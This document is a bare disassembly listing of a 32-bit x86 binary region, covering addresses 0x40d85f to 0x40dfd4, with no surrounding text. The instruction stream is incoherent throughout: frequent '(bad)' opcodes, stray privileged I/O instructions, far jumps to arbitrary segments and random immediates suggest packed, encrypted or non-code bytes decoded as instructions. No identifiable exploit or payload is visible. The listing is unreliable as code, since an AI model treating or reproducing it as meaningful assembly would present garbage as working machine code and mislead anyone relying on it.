  40d85f:	ins    BYTE PTR es:[edi],dx
  40d860:	cmp    DWORD PTR [edi+0x50406c5a],0xbb6f55a0
  40d86a:	ror    bl,0x28
  40d86d:	outs   dx,BYTE PTR ds:[esi]
  40d86e:	test   al,0x8a
  40d870:	pop    ebp
  40d872:	lahf   
  40d873:	inc    edi
  40d874:	je     0x40d87c
  40d876:	popa   
  40d877:	xor    ebp,DWORD PTR [ebx+ebp*1+0x6b]
  40d87b:	pop    ecx
  40d87c:	jo     0x40d845
  40d87e:	sbb    bh,cl
  40d880:	int3   
  40d881:	mov    esi,0x64c93c9
  40d886:	(bad)  
  40d888:	xchg   edx,eax
  40d889:	into   
  40d88a:	inc    esi
  40d88b:	(bad)  
  40d88c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d88d:	xchg   ecx,eax
  40d88e:	dec    esi
  40d88f:	push   esp
  40d890:	push   esp
  40d891:	sbb    eax,0x9d79894e
  40d896:	punpckldq mm1,DWORD PTR [ecx+0x444cef37]
  40d89d:	mov    ebp,0xb3c22744
  40d8a2:	push   edi
  40d8a3:	shl    DWORD PTR [ecx],1
  40d8a5:	pop    ss
  40d8a6:	leave  
  40d8a7:	inc    eax
  40d8a8:	jecxz  0x40d8d7
  40d8aa:	pop    ds
  40d8ab:	sbb    ch,BYTE PTR [esi]
  40d8ad:	sahf   
  40d8ae:	(bad)  
  40d8b0:	xchg   esp,eax
  40d8b1:	and    esp,DWORD PTR [edi-0x36]
  40d8b4:	out    dx,eax
  40d8b5:	xchg   ebx,eax
  40d8b6:	aaa    
  40d8b7:	or     edx,DWORD PTR [ecx]
  40d8b9:	mov    ds:0xd9fc45f8,al
  40d8be:	dec    esp
  40d8bf:	cld    
  40d8c0:	pushf  
  40d8c1:	or     eax,0x56cb4b54
  40d8c6:	mov    esi,0x4b8c5f59
  40d8cb:	pop    es
  40d8cc:	adc    BYTE PTR [esi+esi*8],cl
  40d8cf:	and    al,0xd0
  40d8d1:	lods   al,BYTE PTR ds:[esi]
  40d8d2:	and    DWORD PTR [ecx],ebp
  40d8d4:	xor    ch,BYTE PTR [esi+0x4371c361]
  40d8da:	push   ss
  40d8db:	pop    edx
  40d8dc:	(bad)  
  40d8dd:	sti    
  40d8de:	jge    0x40d8dd
  40d8e0:	test   al,0x4d
  40d8e2:	fidivr DWORD PTR [ebx+0x39]
  40d8e5:	sub    eax,0xef8e2710
  40d8ea:	mov    edi,0x11af993b
  40d8ef:	mov    ebx,0xd7e52487
  40d8f4:	add    edi,ebp
  40d8f6:	aad    0x74
  40d8f8:	xor    bh,BYTE PTR [ebx]
  40d8fa:	(bad)  
  40d8fb:	fnstcw WORD PTR [ebp-0x78]
  40d8fe:	test   DWORD PTR [edi+0x63],0xa3e45de3
  40d905:	bound  edx,QWORD PTR [esi]
  40d907:	test   BYTE PTR [eax],0x27
  40d90a:	icebp  
  40d90b:	mov    esi,0xac805363
  40d910:	jmp    0xb9756d1f
  40d915:	adc    eax,0xbd805fd3
  40d91b:	jg     0x40d91d
  40d91d:	out    dx,eax
  40d91e:	mov    BYTE PTR [edx],ch
  40d920:	loop   0x40d8c7
  40d922:	sbb    ecx,DWORD PTR [edi-0x1c4a2a03]
  40d928:	xor    eax,0x21d5b736
  40d92d:	out    dx,al
  40d92e:	pop    edx
  40d92f:	sub    ecx,DWORD PTR [edx+0x6c83f65b]
  40d935:	pop    edi
  40d936:	sub    eax,0xdac17904
  40d93b:	pusha  
  40d93c:	sub    edx,DWORD PTR [esi+0x3e738f4d]
  40d942:	xchg   ecx,eax
  40d943:	mov    cl,0xe4
  40d945:	aaa    
  40d946:	inc    ecx
  40d947:	(bad)  
  40d948:	xlat   BYTE PTR ds:[ebx]
  40d949:	inc    edx
  40d94a:	push   edx
  40d94b:	adc    eax,0xdb5e745e
  40d950:	dec    edx
  40d951:	int    0x2
  40d953:	push   ss
  40d954:	adc    BYTE PTR [eax+ebx*8],0xe5
  40d958:	data16 mov ds:0xd535faf6,al
  40d95e:	je     0x40d931
  40d960:	add    BYTE PTR [ebx],ch
  40d962:	lods   eax,DWORD PTR ds:[esi]
  40d963:	xchg   edx,eax
  40d964:	lods   eax,DWORD PTR ds:[esi]
  40d965:	ret    0xb2bc
  40d968:	mov    WORD PTR [edi+0x1c888151],?
  40d96e:	pop    ecx
  40d96f:	fist   WORD PTR [edx]
  40d971:	test   al,0xce
  40d973:	shl    eax,1
  40d975:	xchg   ecx,eax
  40d976:	push   edi
  40d977:	(bad)  
  40d978:	pop    ebp
  40d979:	xchg   ebp,eax
  40d97a:	mov    eax,0x7ff32916
  40d97f:	jmp    0x4e2a461a
  40d984:	ss retf 
  40d986:	pop    edx
  40d987:	mov    bh,0x53
  40d989:	shl    DWORD PTR [edi],0xd2
  40d98c:	dec    edx
  40d98d:	cmp    DWORD PTR fs:[ecx+0x72],esi
  40d991:	inc    esi
  40d992:	mov    ebx,0xb69ec4e8
  40d997:	sub    DWORD PTR [edx],esp
  40d999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d99a:	inc    edx
  40d99b:	(bad)  [edi-0x3e]
  40d99e:	cmp    ebx,esi
  40d9a0:	adc    al,dl
  40d9a2:	outs   dx,DWORD PTR ds:[esi]
  40d9a3:	pop    esi
  40d9a4:	shl    edi,0x34
  40d9a7:	dec    ebp
  40d9a8:	retf   0x33f7
  40d9ab:	test   al,0x40
  40d9ad:	out    0x39,eax
  40d9af:	es cs ja 0x40d933
  40d9b3:	lea    ebp,[esi]
  40d9b5:	and    DWORD PTR [esi+0x1bc5f26f],edi
  40d9bb:	pop    edx
  40d9bc:	jae    0x40d966
  40d9be:	and    BYTE PTR [ebx-0x116dd79d],al
  40d9c4:	scas   eax,DWORD PTR es:[edi]
  40d9c5:	jecxz  0x40d9d7
  40d9c7:	dec    edi
  40d9c8:	mov    ds:0x37a25565,eax
  40d9cd:	xlat   BYTE PTR ds:[ebx]
  40d9ce:	das    
  40d9cf:	daa    
  40d9d0:	add    DWORD PTR [ecx],ebp
  40d9d2:	(bad)  
  40d9d3:	mov    ah,0xda
  40d9d5:	sub    ecx,edx
  40d9d7:	jg     0x40d9ae
  40d9d9:	mov    ah,ch
  40d9db:	push   esi
  40d9dc:	adc    ah,al
  40d9de:	xchg   esi,eax
  40d9df:	cld    
  40d9e0:	iret   
  40d9e1:	and    al,0xad
  40d9e3:	pop    ebx
  40d9e4:	mov    eax,0xec80e09a
  40d9e9:	iret   
  40d9ea:	mov    dl,0xad
  40d9ec:	arpl   WORD PTR [edx+0x5a],dx
  40d9ef:	jmp    ebp
  40d9f1:	shl    DWORD PTR [ecx-0x9aeab68],0x87
  40d9f8:	pop    esi
  40d9f9:	jge    0x40da1c
  40d9fb:	hlt    
  40d9fc:	push   ebp
  40d9fd:	repz imul ecx,DWORD PTR [edi+ebp*1+0x3e],0x17a97ee2
  40da06:	lods   al,BYTE PTR ds:[esi]
  40da07:	les    ebp,FWORD PTR [edx-0x63a41106]
  40da0d:	push   edx
  40da0e:	mov    eax,ds:0x62cee9b4
  40da13:	and    al,0x7c
  40da15:	fisub  WORD PTR [edi-0x30]
  40da18:	cmp    bh,ah
  40da1a:	xor    dl,BYTE PTR [ebp-0x791e696d]
  40da20:	xor    ch,BYTE PTR [edx+0x14048f17]
  40da26:	(bad)  
  40da27:	js     0x40d9c8
  40da29:	repz pop edx
  40da2b:	int    0xc9
  40da2d:	mov    dh,0x31
  40da2f:	leave  
  40da30:	pop    edi
  40da31:	jg     0x40d9bd
  40da33:	mov    ah,0x5f
  40da35:	mov    ?,WORD PTR [esi]
  40da37:	jp     0x40da1a
  40da39:	jmp    0x40da78
  40da3b:	xchg   DWORD PTR [edx],edx
  40da3d:	dec    esi
  40da3e:	scas   eax,DWORD PTR es:[edi]
  40da3f:	aam    0xdb
  40da41:	cmp    BYTE PTR [edi],cl
  40da43:	push   esp
  40da44:	sub    eax,0xa89d0d38
  40da49:	jno    0x40d9fd
  40da4b:	lds    edx,FWORD PTR [esi+ebp*1]
  40da4e:	enter  0xfe0a,0x9e
  40da52:	mov    al,0x95
  40da54:	nop
  40da55:	mov    esp,ebp
  40da57:	push   edi
  40da58:	std    
  40da59:	stos   BYTE PTR es:[edi],al
  40da5a:	out    dx,eax
  40da5b:	jp     0x40da37
  40da5d:	inc    ecx
  40da5e:	sub    cl,BYTE PTR [edi+ebx*2+0x4a]
  40da62:	sub    al,0x9e
  40da64:	jecxz  0x40da9b
  40da66:	adc    BYTE PTR [edi+eax*2+0x0],dh
  40da6a:	pushf  
  40da6b:	mov    eax,0x53cd76ac
  40da70:	pushf  
  40da71:	add    eax,0x87546444
  40da76:	fld    QWORD PTR [ecx+edi*8-0x52]
  40da7a:	push   ds
  40da7b:	int    0x9a
  40da7d:	lahf   
  40da7e:	xchg   DWORD PTR [ebx-0x52],ecx
  40da81:	js     0x40da9c
  40da83:	dec    edi
  40da84:	retf   0xd24b
  40da87:	(bad)  
  40da88:	imul   edi
  40da8a:	inc    edi
  40da8b:	jmp    0xddbc:0xa47206a5
  40da92:	in     eax,0x37
  40da94:	das    
  40da95:	sti    
  40da96:	ret    0x58f9
  40da99:	es xchg edx,eax
  40da9b:	bound  esp,QWORD PTR [eax+0x150562b4]
  40daa1:	stos   BYTE PTR es:[edi],al
  40daa2:	sahf   
  40daa3:	add    cl,BYTE PTR [edx+0x76]
  40daa6:	ret    
  40daa7:	loopne 0x40daa2
  40daa9:	pop    edx
  40daaa:	cmp    al,0x31
  40daac:	stos   BYTE PTR es:[edi],al
  40daad:	jge    0x40daba
  40daaf:	popa   
  40dab0:	fnstenv [edi+edi*2+0x56]
  40dab4:	enter  0x4b69,0x64
  40dab8:	jnp    0x40da47
  40daba:	inc    ecx
  40dabb:	push   cs
  40dabc:	repz pop ebp
  40dabe:	pushf  
  40dabf:	loop   0x40da70
  40dac1:	mov    edx,0x719cc07b
  40dac6:	ja     0x40db0a
  40dac8:	loop   0x40da8f
  40daca:	in     al,0xb4
  40dacc:	inc    ebx
  40dacd:	add    dh,BYTE PTR [ebp+0xdffb8df]
  40dad3:	das    
  40dad4:	test   eax,0x8379702b
  40dad9:	push   ecx
  40dada:	xchg   ecx,eax
  40dadb:	fist   WORD PTR [esi-0x411ebf8d]
  40dae1:	mov    ds:0x34740d3c,al
  40dae6:	xor    BYTE PTR [eax+0x33],0x89
  40daea:	rol    DWORD PTR [edi+0x77],0xca
  40daee:	dec    esp
  40daef:	pop    ds
  40daf0:	xchg   ebp,eax
  40daf1:	mov    ds:0x987faab7,eax
  40daf6:	ss push esp
  40daf8:	sub    al,0x81
  40dafa:	mov    eax,ds:0x73ba01c2
  40daff:	jecxz  0x40db4e
  40db01:	cmp    edx,edi
  40db03:	inc    edi
  40db04:	loopne 0x40dadf
  40db06:	jns    0x40da9e
  40db08:	mov    DWORD PTR [esi],eax
  40db0a:	cmp    bl,cl
  40db0c:	add    bh,dh
  40db0e:	repnz sti 
  40db10:	jl     0x40db0e
  40db12:	pop    ebp
  40db13:	or     al,0x3c
  40db15:	add    BYTE PTR [eax-0x68ae7ea6],bl
  40db1b:	fwait
  40db1c:	adc    ebp,edx
  40db1e:	mov    ?,WORD PTR ds:0xbd099b3a
  40db24:	mov    dh,0x25
  40db26:	sbb    al,0x9d
  40db28:	xchg   ebp,eax
  40db29:	add    BYTE PTR [eax+eiz*1+0x4d18f448],dh
  40db30:	ror    DWORD PTR [edi-0x29],0xc6
  40db34:	xchg   edx,eax
  40db35:	jp     0x40dbb0
  40db37:	push   eax
  40db38:	mov    bh,0x51
  40db3a:	repnz cmp BYTE PTR [edi],0x15
  40db3e:	dec    eax
  40db3f:	add    eax,0xafc600cf
  40db44:	dec    edi
  40db45:	push   ds
  40db46:	test   BYTE PTR [edi-0x73],cl
  40db49:	fdivr  QWORD PTR [edi]
  40db4b:	and    ch,dh
  40db4d:	dec    ebp
  40db4e:	xchg   esi,eax
  40db4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db50:	push   ebx
  40db51:	rcr    DWORD PTR [ecx+0x2d],cl
  40db54:	mov    edx,0xe5a72602
  40db59:	sbb    edi,ecx
  40db5b:	mov    bh,0x9e
  40db5d:	or     BYTE PTR [edx],0x37
  40db60:	mov    ecx,0x72af76e2
  40db65:	ja     0x40db41
  40db67:	fld    TBYTE PTR [ebp-0x49c6ca86]
  40db6d:	jne    0x40db55
  40db6f:	xor    eax,0x7bcbde5f
  40db74:	dec    ebp
  40db75:	xor    al,0xb9
  40db77:	ins    DWORD PTR es:[edi],dx
  40db78:	dec    ebx
  40db79:	mov    ds:0x68c6e218,al
  40db7e:	or     al,0x5e
  40db80:	mov    esi,DWORD PTR [esi+0x75]
  40db83:	or     eax,0xed890e22
  40db88:	sub    eax,0x179f8622
  40db8d:	out    dx,eax
  40db8e:	imul   ecx,DWORD PTR [ebp-0x5c],0xe90a6321
  40db95:	(bad)  
  40db96:	pop    ebx
  40db97:	or     dl,BYTE PTR [esp+edx*8+0x41]
  40db9b:	fnsave [esi-0x74]
  40db9e:	xor    al,0x9a
  40dba0:	xchg   ebp,eax
  40dba1:	into   
  40dba2:	fsubr  QWORD PTR [eax]
  40dba4:	mov    dh,0x4c
  40dba6:	and    BYTE PTR [esi+ebp*8],ah
  40dba9:	xchg   esp,eax
  40dbaa:	dec    ebp
  40dbab:	xchg   ebx,eax
  40dbac:	mov    cl,0xdb
  40dbae:	xlat   BYTE PTR ds:[ebx]
  40dbaf:	mov    eax,0xed46ea74
  40dbb4:	int3   
  40dbb5:	inc    esp
  40dbb6:	dec    edx
  40dbb7:	jo     0x40db63
  40dbb9:	mov    dh,0x22
  40dbbb:	mov    al,BYTE PTR [ebp-0xb616d69]
  40dbc1:	add    esp,DWORD PTR [ebx-0x6b]
  40dbc4:	mov    bl,0x77
  40dbc6:	in     eax,0x2a
  40dbc8:	(bad)  
  40dbc9:	inc    dl
  40dbcb:	mov    al,0x8d
  40dbcd:	jge    0x40dc24
  40dbcf:	push   0x988fec17
  40dbd4:	and    BYTE PTR [ebp-0x542e647],0x21
  40dbdb:	push   ebp
  40dbdc:	shl    DWORD PTR [esi],cl
  40dbde:	lods   al,BYTE PTR ds:[esi]
  40dbdf:	in     al,0x75
  40dbe1:	push   edi
  40dbe2:	jp     0x40dc40
  40dbe4:	cli    
  40dbe5:	pushf  
  40dbe6:	mov    bh,0xe
  40dbe8:	repnz and ecx,0x46
  40dbec:	jmp    0x6e728914
  40dbf1:	xchg   edi,eax
  40dbf2:	cmp    BYTE PTR [edi-0x450681ac],al
  40dbf8:	in     al,0xc5
  40dbfa:	push   ebx
  40dbfb:	addr16 mov dh,0x3f
  40dbfe:	mov    cs,WORD PTR [ebx]
  40dc00:	sbb    BYTE PTR [ebx+0x3bbde297],bl
  40dc06:	push   0xffffffef
  40dc08:	in     eax,dx
  40dc09:	fiadd  WORD PTR [ebx+0x7a]
  40dc0c:	cmp    bh,BYTE PTR [ecx+0xf]
  40dc0f:	or     DWORD PTR ds:0x7f4b1dd1,0x5e
  40dc16:	mov    eax,ds:0xd774dfa1
  40dc1b:	(bad)  
  40dc1c:	popa   
  40dc1d:	pop    edi
  40dc1e:	(bad)
  40dc22:	inc    BYTE PTR [eax]
  40dc24:	xchg   ebx,eax
  40dc25:	(bad)  
  40dc26:	je     0x40dc2a
  40dc28:	stc    
  40dc29:	rol    DWORD PTR [edi-0x58],cl
  40dc2c:	arpl   WORD PTR [edi],bx
  40dc2e:	add    DWORD PTR [edx],esi
  40dc30:	xor    BYTE PTR [ebp+edx*4-0x30],0x4d
  40dc35:	sub    ah,dl
  40dc37:	pusha  
  40dc38:	push   es
  40dc39:	data16 fsub DWORD PTR [ebx]
  40dc3c:	sbb    DWORD PTR [ecx-0x1be2396a],ebp
  40dc42:	jae    0x40dc95
  40dc44:	jbe    0x40dc2c
  40dc46:	sub    eax,0x9265be64
  40dc4b:	xchg   edi,eax
  40dc4c:	adc    ebp,DWORD PTR [edx+0x8c0e3f1]
  40dc52:	dec    ebx
  40dc53:	mov    eax,DWORD PTR [ebp-0x1328eb6b]
  40dc59:	sbb    BYTE PTR [eax+edi*8-0x69519c96],dl
  40dc60:	daa    
  40dc61:	xchg   cl,dh
  40dc63:	in     al,dx
  40dc64:	inc    esp
  40dc65:	adc    BYTE PTR [edx+0xd98d2a6],ch
  40dc6b:	aad    0x26
  40dc6d:	iret   
  40dc6e:	out    0x4b,al
  40dc70:	das    
  40dc71:	push   eax
  40dc72:	ss inc ebx
  40dc74:	sti    
  40dc75:	jo     0x40dc8d
  40dc77:	cmc    
  40dc78:	push   0xab89eec8
  40dc7d:	mov    esi,DWORD PTR [ebx+0x54667139]
  40dc83:	imul   esi,DWORD PTR ss:[bx+0x307a],0x18
  40dc8a:	xor    BYTE PTR [eax+0x5027c50d],bh
  40dc90:	jne    0x40dce5
  40dc92:	shr    ebp,cl
  40dc94:	sub    eax,0xe5d356dd
  40dc99:	outs   dx,BYTE PTR ds:[esi]
  40dc9a:	sbb    eax,0x27e95d81
  40dc9f:	xchg   ecx,eax
  40dca0:	and    esp,DWORD PTR [edi-0x12547d23]
  40dca6:	test   eax,0x4d66c756
  40dcab:	scas   al,BYTE PTR es:[edi]
  40dcac:	repnz fidivr WORD PTR [ebp-0x56]
  40dcb0:	sub    BYTE PTR [ebx-0x11],bh
  40dcb3:	add    esi,esi
  40dcb5:	inc    esp
  40dcb6:	dec    ecx
  40dcb7:	test   eax,0x3d228872
  40dcbc:	ret    
  40dcbd:	jmp    0x9d50:0xa5d0f043
  40dcc4:	mov    ah,0x9c
  40dcc6:	fiadd  WORD PTR [ebx+edi*1]
  40dcc9:	in     eax,0x4b
  40dccb:	xchg   di,ax
  40dccd:	jae    0x40dc84
  40dccf:	and    esp,esi
  40dcd1:	scas   al,BYTE PTR es:[edi]
  40dcd2:	push   edi
  40dcd3:	imul   edi,DWORD PTR [edi+0x594c32dd],0xb9fff592
  40dcdd:	addr16 nop
  40dcdf:	pushf  
  40dce0:	mov    esp,0xf3c90b53
  40dce5:	mov    esp,edi
  40dce7:	(bad)  
  40dce8:	(bad)  
  40dcea:	sbb    ecx,DWORD PTR [edx+0x50b600ac]
  40dcf0:	loop   0x40dd4d
  40dcf2:	(bad)  
  40dcf3:	outs   dx,BYTE PTR ds:[esi]
  40dcf4:	pop    es
  40dcf5:	pop    eax
  40dcf6:	arpl   WORD PTR [ebx],bx
  40dcf8:	jmp    0xe9ba:0x6f5d8672
  40dcff:	and    eax,0x264864c4
  40dd04:	push   0xa5b7be58
  40dd09:	clc    
  40dd0a:	xor    eax,0x95e926cb
  40dd0f:	or     cl,BYTE PTR [edi]
  40dd11:	mov    ds:0xc60c2a0e,eax
  40dd16:	outs   dx,BYTE PTR ds:[esi]
  40dd17:	aaa    
  40dd18:	ds pop ecx
  40dd1a:	dec    edi
  40dd1b:	push   eax
  40dd1c:	data16 sti 
  40dd1e:	ds call 0xfd18:0x3dd86463
  40dd26:	add    esi,edi
  40dd28:	mov    dh,0x27
  40dd2a:	ins    DWORD PTR es:[edi],dx
  40dd2b:	aaa    
  40dd2c:	mov    ds:0xa3d19148,eax
  40dd31:	aaa    
  40dd32:	stc    
  40dd33:	sbb    bl,dh
  40dd35:	or     bl,dh
  40dd37:	push   ebp
  40dd38:	aad    0x25
  40dd3a:	jno    0x40dcdd
  40dd3c:	cmovg  eax,edx
  40dd3f:	test   BYTE PTR [ebx+0x2f3e34db],0xca
  40dd46:	dec    eax
  40dd47:	fdivr  DWORD PTR [ecx+0x4d]
  40dd4a:	push   ebp
  40dd4b:	fcom   DWORD PTR [ecx+eiz*2-0x53331089]
  40dd52:	test   al,0x9a
  40dd54:	pop    esp
  40dd56:	xor    al,0x7f
  40dd58:	hlt    
  40dd59:	stc    
  40dd5a:	mov    esp,0xa50bed0d
  40dd5f:	xor    DWORD PTR [eax-0x652249a7],ebp
  40dd65:	into   
  40dd66:	hlt    
  40dd67:	fs clc 
  40dd69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd6a:	dec    eax
  40dd6b:	test   DWORD PTR [edi+0x29bc907e],0x8e5d5e6b
  40dd75:	out    dx,eax
  40dd76:	push   ebx
  40dd77:	jno    0x40dd0c
  40dd79:	push   ss
  40dd7a:	sub    dh,BYTE PTR ds:[edi]
  40dd7d:	jo     0x40dd06
  40dd7f:	fdiv   st,st(7)
  40dd81:	ins    DWORD PTR es:[edi],dx
  40dd82:	pusha  
  40dd83:	sub    bh,BYTE PTR [edx]
  40dd85:	pop    eax
  40dd86:	sahf   
  40dd87:	stos   BYTE PTR es:[edi],al
  40dd88:	fwait
  40dd89:	add    BYTE PTR [eax+0x33a44a66],bl
  40dd8f:	sbb    al,BYTE PTR [edx+0x65520b4e]
  40dd95:	and    al,0x2a
  40dd97:	add    edx,DWORD PTR [edx]
  40dd99:	jmp    0x1242eb72
  40dd9e:	add    BYTE PTR [ecx+0x3067cdd3],dh
  40dda4:	sub    BYTE PTR es:[ecx],dh
  40dda7:	mov    ecx,DWORD PTR [eax]
  40dda9:	shr    cl,1
  40ddab:	push   0xce317663
  40ddb0:	mov    ecx,0x370ffd1f
  40ddb5:	in     eax,dx
  40ddb6:	inc    ecx
  40ddb7:	and    eax,0x87761d91
  40ddbc:	mov    ds:0x8120e045,al
  40ddc1:	(bad)  
  40ddc2:	cdq    
  40ddc3:	xchg   edx,eax
  40ddc4:	adc    al,0xbc
  40ddc6:	inc    ebp
  40ddc7:	dec    edi
  40ddc8:	cmp    ah,al
  40ddca:	(bad)  
  40ddcb:	jbe    0x40de30
  40ddcd:	cwde   
  40ddce:	xchg   ebp,eax
  40ddcf:	rol    ch,0x43
  40ddd2:	(bad)  
  40ddd3:	imul   edx,DWORD PTR [ebp+0x2b69a240],0xffffffd2
  40ddda:	cwde   
  40dddb:	stc    
  40dddc:	cdq    
  40dddd:	aaa    
  40ddde:	idiv   DWORD PTR [edi+0x7a888cf0]
  40dde4:	fs call 0xf35d070e
  40ddea:	push   esi
  40ddeb:	call   0x392030ca
  40ddf0:	cmp    dh,BYTE PTR [edx+0x433a2a1a]
  40ddf6:	mov    bl,0xe7
  40ddf8:	sub    BYTE PTR [edx],dh
  40ddfa:	neg    BYTE PTR [ebx-0x2f1ee83a]
  40de00:	jle    0x40de05
  40de02:	jmp    0x5049:0x18ed068f
  40de09:	sbb    eax,0x6b8a2758
  40de0e:	cmovo  ebp,edx
  40de11:	add    BYTE PTR [ecx-0x5b5c5acd],0xe9
  40de18:	pop    eax
  40de19:	aad    0xc0
  40de1b:	xor    eax,0xa3f5c4db
  40de20:	mov    dh,0x4c
  40de22:	cmp    eax,DWORD PTR [ebx-0x77f7dc8a]
  40de28:	imul   ecx,ecx,0x9965d9ab
  40de2e:	push   esi
  40de2f:	mov    ds:0x95f52e03,al
  40de34:	rcl    BYTE PTR [edi],0x34
  40de37:	mov    al,0x8c
  40de39:	loopne 0x40de56
  40de3b:	pop    ecx
  40de3c:	inc    ebx
  40de3d:	inc    ebp
  40de3e:	(bad)  
  40de3f:	dec    ebx
  40de40:	rcr    BYTE PTR [esi],1
  40de42:	loop   0x40ddd2
  40de44:	or     ebx,edx
  40de46:	outs   dx,BYTE PTR ds:[esi]
  40de47:	push   0x5e414183
  40de4c:	icebp  
  40de4d:	xchg   ecx,eax
  40de4e:	test   al,ch
  40de50:	sbb    edx,edi
  40de52:	sub    DWORD PTR [edi+edx*1],0x654603a3
  40de59:	fiadd  DWORD PTR gs:[ebp+0x3f]
  40de5d:	retf   0xc0a0
  40de60:	cmp    eax,0xaac9bb2d
  40de65:	scas   al,BYTE PTR es:[edi]
  40de66:	loopne 0x40ddf9
  40de68:	push   cs
  40de69:	adc    ebx,DWORD PTR [eax-0x41]
  40de6c:	or     BYTE PTR [ebx],bh
  40de6e:	das    
  40de6f:	int3   
  40de70:	in     eax,dx
  40de71:	test   DWORD PTR [edi+0x5787c720],ebx
  40de77:	arpl   WORD PTR [ebx+ebx*4+0x5e716231],di
  40de7e:	pusha  
  40de7f:	pushf  
  40de80:	xchg   ebx,eax
  40de81:	push   edi
  40de82:	repz cmp bh,BYTE PTR [ebp-0x41]
  40de86:	in     eax,0x83
  40de88:	adc    cl,ah
  40de8a:	int3   
  40de8b:	sbb    bh,BYTE PTR [edi-0x5d3b1b88]
  40de91:	push   esp
  40de92:	iret   
  40de93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de94:	and    esp,esp
  40de96:	aaa    
  40de97:	xor    DWORD PTR [esi-0x5f],ecx
  40de9a:	push   edx
  40de9b:	sbb    al,ch
  40de9d:	push   ss
  40de9e:	lods   eax,DWORD PTR ds:[esi]
  40de9f:	mov    eax,0xb86b823f
  40dea4:	mov    bl,0x34
  40dea6:	dec    esp
  40dea7:	inc    dx
  40dea9:	push   eax
  40deaa:	cmc    
  40deab:	inc    ebx
  40deac:	adc    BYTE PTR [esi+0x246c09e7],dh
  40deb2:	aaa    
  40deb3:	ds jae 0x40de70
  40deb6:	dec    edx
  40deb7:	cmp    ebx,DWORD PTR [ecx+0x5e2479a1]
  40debd:	(bad)  
  40debe:	call   edx
  40dec0:	mov    ds:0x97bafc20,al
  40dec5:	add    al,0xd6
  40dec7:	jp     0x40de89
  40dec9:	mov    ch,0xc7
  40decb:	sbb    dl,BYTE PTR [edx-0x29]
  40dece:	mov    al,0xb0
  40ded0:	ret    
  40ded1:	sar    BYTE PTR [edi],cl
  40ded3:	cld    
  40ded4:	mov    ecx,0x5d5cfc24
  40ded9:	sbb    dl,BYTE PTR [edi]
  40dedb:	sti    
  40dedc:	test   al,0x8f
  40dede:	test   al,0xb9
  40dee0:	daa    
  40dee1:	mov    ebx,DWORD PTR [ebx-0x7e826e99]
  40dee7:	into   
  40dee8:	lods   al,BYTE PTR ds:[esi]
  40dee9:	mov    ebp,0x290ea7d6
  40deee:	push   cs
  40deef:	test   ebx,ebx
  40def1:	imul   edx,DWORD PTR [esi],0x10670836
  40def7:	rcl    DWORD PTR [ebx+0x3baa2392],1
  40defd:	scas   al,BYTE PTR es:[edi]
  40defe:	push   edx
  40deff:	sub    dl,BYTE PTR [ecx+0x2a]
  40df02:	(bad)  
  40df04:	or     al,0x1a
  40df06:	scas   eax,DWORD PTR es:[edi]
  40df07:	add    al,0xc5
  40df09:	ins    BYTE PTR es:[edi],dx
  40df0a:	sub    dl,BYTE PTR [ebp-0x1bf30e99]
  40df10:	in     eax,0x24
  40df12:	pusha  
  40df13:	cmp    bh,BYTE PTR [ebp-0x7e3a54e1]
  40df19:	fisubr DWORD PTR [edx+0x115b2e1c]
  40df1f:	push   ss
  40df20:	rol    ebx,1
  40df22:	inc    edi
  40df23:	dec    esp
  40df24:	ja     0x40def0
  40df26:	fidivr DWORD PTR [ebx+ebp*2]
  40df29:	push   edx
  40df2a:	mov    eax,ebp
  40df2c:	clc    
  40df2d:	jecxz  0x40deb8
  40df2f:	daa    
  40df30:	in     eax,dx
  40df31:	in     eax,0x79
  40df33:	inc    ecx
  40df34:	retf   0x4134
  40df37:	and    al,0xfd
  40df39:	ds xor al,0xe0
  40df3c:	or     ebx,DWORD PTR [eax+0x67]
  40df3f:	(bad)  
  40df40:	je     0x40dfb2
  40df42:	inc    edx
  40df43:	test   eax,0x9d4dbfd3
  40df48:	sbb    esi,ebx
  40df4a:	mov    ch,0xca
  40df4c:	add    ah,dl
  40df4e:	imul   BYTE PTR [esi]
  40df50:	adc    edi,edi
  40df52:	cs lock cli 
  40df55:	pop    ebx
  40df56:	xchg   esp,eax
  40df57:	popa   
  40df58:	std    
  40df59:	push   ss
  40df5a:	sahf   
  40df5b:	test   eax,0x1ffd82f5
  40df60:	dec    eax
  40df61:	shl    BYTE PTR [esp+edx*2],cl
  40df64:	xchg   ebx,eax
  40df65:	and    eax,0x57b7fe05
  40df6a:	jge    0x40dfaf
  40df6c:	jb     0x40df54
  40df6e:	jbe    0x40df20
  40df70:	shr    BYTE PTR [ebx-0x229cfd8a],cl
  40df76:	xor    eax,DWORD PTR [ebx-0x4f]
  40df79:	add    bl,BYTE PTR [ebx+0x7e7f85f1]
  40df7f:	fsubr  QWORD PTR [edi+0x14]
  40df82:	gs neg bl
  40df85:	pop    ecx
  40df86:	inc    edi
  40df87:	xor    eax,0x704a8455
  40df8c:	lods   eax,DWORD PTR ds:[esi]
  40df8d:	fld1   
  40df8f:	(bad)  
  40df90:	cld    
  40df91:	fwait
  40df92:	repz pop esi
  40df94:	sbb    al,0xd7
  40df96:	xchg   edi,eax
  40df97:	mov    BYTE PTR [edx+0x7cd00b7e],cl
  40df9d:	ins    DWORD PTR es:[edi],dx
  40df9e:	pushf  
  40df9f:	xchg   ebp,eax
  40dfa0:	imul   ebp,DWORD PTR [ebp+0x7daf34fe],0x26
  40dfa7:	mov    BYTE PTR [edi],0x74
  40dfaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfab:	aad    0x70
  40dfad:	jl     0x40e028
  40dfaf:	aas    
  40dfb0:	shufps xmm1,XMMWORD PTR [ecx+0x1a],0x2b
  40dfb5:	clc    
  40dfb6:	scas   al,BYTE PTR es:[edi]
  40dfb7:	hlt    
  40dfb8:	push   ss
  40dfb9:	fild   DWORD PTR [edi-0x20]
  40dfbc:	loope  0x40dfdd
  40dfbe:	jle    0x40df6b
  40dfc0:	push   esi
  40dfc1:	xchg   ecx,eax
  40dfc2:	push   esp
  40dfc3:	jno    0x40dff4
  40dfc5:	mov    ecx,0x84364b30
  40dfca:	ret    0xd8db
  40dfcd:	pop    ebp
  40dfce:	idiv   DWORD PTR gs:[edi+0x22]
  40dfd2:	mov    cl,cl
  40dfd4:	mov    WORD PTR [ebx-0x3e],?
